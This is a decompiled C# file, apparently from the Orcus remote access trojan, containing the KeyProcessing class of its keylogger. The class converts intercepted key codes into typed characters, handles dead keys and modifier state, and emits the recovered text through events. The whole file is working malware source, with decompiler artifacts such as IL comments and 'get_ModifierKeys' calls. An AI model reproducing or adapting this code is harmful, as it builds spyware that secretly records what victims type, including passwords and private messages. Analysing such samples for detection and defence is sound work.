using System;
using System.Collections;
using System.Text;
using System.Windows.Forms;
using Orcus.Native;

namespace Orcus.Utilities.KeyLogger;

internal class KeyProcessing
{
	private readonly ArrayList _deadKeys = new ArrayList();

	private bool _deadKeyOver;

	private bool _lastWasDeadKey;

	public event EventHandler<StringDownEventArgs> StringDown;

	public event EventHandler<StringDownEventArgs> StringUp;

	private void OnKeyActionFurtherProcessing2(uint vkcode, uint nScanCode, bool isDown, byte[] kbstate)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		Keys val = (Keys)vkcode;
		string text = ((object)(Keys)(ref val)).ToString();
		if (IsPrintableKey(vkcode) && !IsCtrlPressed())
		{
			StringBuilder stringBuilder = new StringBuilder(2);
			int num = NativeMethods.ToAscii(vkcode, nScanCode, kbstate, stringBuilder, 0u);
			_deadKeyOver = false;
			if (num != 0 && stringBuilder.Length > 0)
			{
				text = stringBuilder.ToString().Substring(0, 1);
			}
		}
		if (isDown)
		{
			this.StringDown?.Invoke(text, new StringDownEventArgs(text.Length == 1, text, vkcode));
		}
		else
		{
			this.StringUp?.Invoke(text, new StringDownEventArgs(text.Length == 1, text, vkcode));
		}
	}

	internal void ProcessKeyAction(uint vkcode, uint nScanCode, bool isDown)
	{
		if (IsDeadKey(vkcode))
		{
			_lastWasDeadKey = true;
			byte[] array = MyGetKeyboardState();
			_deadKeys.Add(new object[4] { vkcode, nScanCode, isDown, array });
			return;
		}
		if (_lastWasDeadKey)
		{
			byte[] array2 = MyGetKeyboardState();
			_deadKeyOver = true;
			_lastWasDeadKey = false;
			_deadKeys.Add(new object[4] { vkcode, nScanCode, isDown, array2 });
			return;
		}
		if (_deadKeyOver)
		{
			foreach (object[] deadKey in _deadKeys)
			{
				OnKeyActionFurtherProcessing2((uint)deadKey[0], (uint)deadKey[1], (bool)deadKey[2], (byte[])deadKey[3]);
				if (IsDeadKey((uint)deadKey[0]))
				{
					NativeMethods.ToAscii(vkcode, nScanCode, (byte[])deadKey[3], new StringBuilder(2), 0u);
				}
			}
			_deadKeys.Clear();
		}
		byte[] kbstate = MyGetKeyboardState();
		OnKeyActionFurtherProcessing2(vkcode, nScanCode, isDown, kbstate);
	}

	private static byte[] MyGetKeyboardState()
	{
		byte[] array = new byte[256];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)NativeMethods.GetKeyState(i);
		}
		return array;
	}

	private bool IsPrintableKey(uint vkCode)
	{
		return vkCode >= 32;
	}

	private static bool IsDeadKey(uint vkCode)
	{
		return (ulong)(NativeMethods.MapVirtualKey(vkCode, MapVirtualKeyMapTypes.MAPVK_VK_TO_CHAR) & 0x80000000L) > 0uL;
	}

	private bool IsCtrlPressed()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Invalid comparison between Unknown and I4
		return (int)Control.get_ModifierKeys() == 131072;
	}
}
